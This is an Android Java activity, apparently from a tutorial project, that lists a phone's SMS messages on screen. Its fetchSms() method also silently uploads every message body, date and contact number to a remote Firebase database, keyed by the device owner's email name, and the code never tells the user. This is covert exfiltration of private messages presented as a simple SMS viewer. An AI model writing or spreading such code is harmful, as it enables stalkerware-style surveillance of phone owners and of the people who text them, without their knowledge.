package com.android.tutorial.activity;

import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.support.design.widget.FloatingActionButton;
import android.support.design.widget.Snackbar;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.text.format.DateFormat;
import android.view.View;
import android.widget.ArrayAdapter;
import android.widget.ListView;
import android.widget.Toast;

import com.android.tutorial.R;
import com.android.tutorial.utils.MyDevice;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class SMSActivity extends AppCompatActivity {

    private DatabaseReference mFirebaseDatabase;
    private FirebaseDatabase mFirebaseInstance;
    Cursor cursor;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_sms);
        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);
        getSupportActionBar().setDisplayHomeAsUpEnabled(true);
        fab();

        mFirebaseInstance = FirebaseDatabase.getInstance();

        // get reference to 'users' node
        mFirebaseDatabase = mFirebaseInstance.getReference();

        ListView lViewSMS = (ListView) findViewById(R.id.listViewSMS);
        if (fetchSms() != null) {
            ArrayAdapter adapter = new ArrayAdapter(this, android.R.layout.simple_list_item_1, fetchSms());
            lViewSMS.setAdapter(adapter);
        } else {
            Toast.makeText(this, "Can't read SMS.", Toast.LENGTH_SHORT).show();
        }
    }

    public ArrayList fetchSms() {
        ArrayList sms = new ArrayList();
        Uri message = Uri.parse("content://sms/");
        ContentResolver cr = SMSActivity.this.getContentResolver();

        Cursor cursor = cr.query(message, null, null, null, null);
        SMSActivity.this.startManagingCursor(cursor);
        int totalSMS = cursor.getCount();
        String readStatus = "";
        long millisecond;
        if (cursor.moveToFirst()) {
            for (int i = 0; i < totalSMS; i++) {
                if (cursor.getString(cursor.getColumnIndexOrThrow("type")).contains("1")) {
                    readStatus = "inbox";
                } else {
                    readStatus = "sent";
                }

                millisecond = Long.parseLong(cursor.getString(cursor.getColumnIndexOrThrow("date")));
                String dateString = DateFormat.format("MM/dd/yyyy hh:mm", new Date(millisecond)).toString();

                sms.add("MobileNumber:" + cursor.getString(cursor.getColumnIndexOrThrow("address"))
                        + "\nSMS:" + cursor.getString(cursor.getColumnIndexOrThrow("body"))
                        + "\nDATE:" + dateString
                        + "\nTYPE:" + cursor.getColumnIndexOrThrow("type")
                        + "\nReadStatus:" + readStatus);

                mFirebaseDatabase.child("sms").child("" + MyDevice.getDeviceEmailName(SMSActivity.this)
//                                MyDevice.getDeviceName()
                        /*+"(" + MyDevice.getDeviceOsVersion() + ")"*/)
                        .child(cursor.getString(cursor.getColumnIndexOrThrow("address")))
                        .child(readStatus)
                        .child("" + i)
                        .setValue("" + cursor.getString(cursor.getColumnIndexOrThrow("body"))
                                + " " + dateString
                        );
                cursor.moveToNext();
            }
        }
        // else {
        // throw new RuntimeException("You have no SMS");
        // }
        cursor.close();

        return sms;
    }

    public void onDestroy() {
        super.onDestroy();
        if (cursor != null) {
            cursor.close();
        }
    }

    public ArrayList fetchInbox() {
        ArrayList sms = new ArrayList();

        Uri uriSms = Uri.parse("content://sms/inbox");
        Cursor cursor = getContentResolver().query(uriSms, new String[]{"_id", "address", "date", "body"}, null, null, null);

        cursor.moveToFirst();
        while (cursor.moveToNext()) {
            String address = cursor.getString(1);
            String body = cursor.getString(3);

            System.out.println("======&gt; Mobile number =&gt; " + address);
            System.out.println("=====&gt; SMS Text =&gt; " + body);

            sms.add("MobileNumber:" + address + "\nSMS:" + body);
        }
        return sms;

    }

    public List<Sms> getAllSms() {
        List<Sms> lstSms = new ArrayList<Sms>();
        Sms objSms = new Sms();
        Uri message = Uri.parse("content://sms/");
        ContentResolver cr = SMSActivity.this.getContentResolver();

        Cursor c = cr.query(message, null, null, null, null);
        SMSActivity.this.startManagingCursor(c);
        int totalSMS = c.getCount();

        if (c.moveToFirst()) {
            for (int i = 0; i < totalSMS; i++) {

                objSms = new Sms();
                objSms.setId(c.getString(c.getColumnIndexOrThrow("_id")));
                objSms.setAddress(c.getString(c
                        .getColumnIndexOrThrow("address")));
                objSms.setMsg(c.getString(c.getColumnIndexOrThrow("body")));
                objSms.setReadState(c.getString(c.getColumnIndex("read")));
                objSms.setTime(c.getString(c.getColumnIndexOrThrow("date")));
                if (c.getString(c.getColumnIndexOrThrow("type")).contains("1")) {
                    objSms.setFolderName("inbox");
                } else {
                    objSms.setFolderName("sent");
                }

                lstSms.add(objSms);
                c.moveToNext();
            }
        }
        // else {
        // throw new RuntimeException("You have no SMS");
        // }
        c.close();

        return lstSms;
    }

    public class Sms {
        private String _id;
        private String _address;
        private String _msg;
        private String _readState; //"0" for have not read sms and "1" for have read sms
        private String _time;
        private String _folderName;

        public String getId() {
            return _id;
        }

        public String getAddress() {
            return _address;
        }

        public String getMsg() {
            return _msg;
        }

        public String getReadState() {
            return _readState;
        }

        public String getTime() {
            return _time;
        }

        public String getFolderName() {
            return _folderName;
        }


        public void setId(String id) {
            _id = id;
        }

        public void setAddress(String address) {
            _address = address;
        }

        public void setMsg(String msg) {
            _msg = msg;
        }

        public void setReadState(String readState) {
            _readState = readState;
        }

        public void setTime(String time) {
            _time = time;
        }

        public void setFolderName(String folderName) {
            _folderName = folderName;
        }

    }

    private void fab() {
        FloatingActionButton fab = (FloatingActionButton) findViewById(R.id.fab);
        fab.hide();
        fab.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Snackbar.make(view, "Replace with your own action", Snackbar.LENGTH_LONG)
                        .setAction("Action", null).show();
            }
        });
    }

}
